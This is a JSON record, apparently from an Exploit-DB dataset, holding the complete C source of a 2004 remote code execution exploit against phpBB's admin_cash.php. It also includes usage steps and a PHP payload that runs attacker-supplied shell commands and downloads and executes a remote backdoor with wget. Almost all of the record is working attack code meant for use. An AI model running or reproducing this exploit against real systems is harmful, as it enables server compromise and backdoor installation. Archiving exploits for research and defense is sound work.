{
  "id": "676",
  "title": "phpBB 1.0.0/2.0.10 - &#039;admin_cash.php&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "/*\r\n exploit for phpBB 1.0.0 - 2.0.10\r\n \r\n edit the b4b0.php file with the correct url to your backdoor and the correct filename for your backdoor upload it to a webserver.\r\n\r\n gcc -o b4b0-phpbb b4b0-phpbb.c\r\n\r\n./b4b0-phpbb <url_to_system> <phpbb_dir> <url_to_b4b0.php>\r\ntelnet <url_of_exploited_system> <port_of_back_door>\r\n\r\ngreets to b4b0 \r\n\r\n\t-- evilrabbi\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <netdb.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n\r\nvoid help(char *program_name);\r\n\r\nint main(int argc, char *argv[]) {\r\n\r\n        struct sockaddr_in trg;\r\n        struct hostent *he;\r\n\r\n        int sockfd, buff;\r\n\tchar buffer[1024];\r\n\tchar *request;\r\n\r\n\tif(argc != 4 ) {\r\n\t\thelp(argv[0]);\r\n\t\texit(0);\r\n\t} \r\n \r\n        he = gethostbyname(argv[1]);\r\n        sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n\trequest = (char *) malloc(1024);\r\n\r\n        trg.sin_family = AF_INET;\r\n        trg.sin_port = htons(80);\r\n        trg.sin_addr = *((struct in_addr *) he->h_addr);\r\n        memset(&(trg.sin_zero), '\\0', 8);\r\n\t\r\n\tconnect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr));\r\n\tsprintf(request,\"GET http://%s/%s/admin/admin_cash.php?setmodules=1&phpbb_root_path=http://%s?cmd=w\\n\",argv[1],argv[2],argv[3]);\r\n\tsend(sockfd,request,strlen(request),0);\r\n\tbuff=recv(sockfd, buffer, 1024-1, 0);\r\n\tbuffer[buff] = '\\0';\r\n\tprintf(\"%s\",buffer);\r\n\tclose(sockfd);\r\n\treturn 0;\r\n\r\n}\r\n\r\nvoid help(char *program_name) {\r\n\r\n\tprintf(\"b4b0-phpbb.c by evilrabbi for b4b0\\n\\n\");\r\n\tprintf(\"%s hostname phpbb2_dir url_to_bad_php\\n\",program_name);\r\n\tprintf(\"%s www.example.com phpBB2 blah.com/b4b0.php.php\\n\",program_name);\r\n}\r\n\r\n\r\n/* Start of b4b0.php */\r\n\r\n/*\r\n\r\nb4b0 kickin ass again.......\r\nSystem was exploited telnet to the port you have your backdoor set to listen on.\r\n<?\r\n if (isset($chdir)) @chdir($chdir);\r\n  ob_start();\r\n  system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");\r\n   system(\"cd /tmp; wget url_to_backdoor;chmod +x backdoor_name;./backdoor_name\"); // EDIT THIS INFO!!!!!!!!!!!!!\r\n   $output = ob_get_contents();\r\n  ob_end_clean();\r\n  if (!empty($output)) echo str_replace(\">\", \">\", str_replace(\"<\", \"<\", $output));\r\n?>\r\n\r\n*/\r\n\r\n// milw0rm.com [2004-12-05]",
  "url": "https://www.exploit-db.com/exploits/676"
}